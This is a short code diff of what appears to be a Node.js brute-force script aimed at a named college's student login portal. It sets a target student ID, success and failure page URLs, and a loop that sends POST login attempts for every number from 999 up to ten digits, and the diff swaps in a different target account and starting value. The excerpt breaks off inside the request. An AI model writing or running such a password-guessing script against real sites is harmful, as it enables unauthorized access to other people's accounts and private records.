@@ -11,7 +11,7 @@ const port = 3000;
 
 let i;
 let isInitiated;
-const username = 2412800;
+const username = 2412232;
 const fail_url = "https://agclms.in/Elogin/StudentLogin";
 const succ_url = "https://agclms.in/DashBoardStudent";
 
@@ -35,7 +35,7 @@ app.listen(port, () => {
 
 const main = async () => {
     try {
-        for (i = 23283; i <= 9999999999; i++) {
+        for (i = 999; i <= 9999999999; i++) {
             const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
                 method: "POST",
                 headers: {
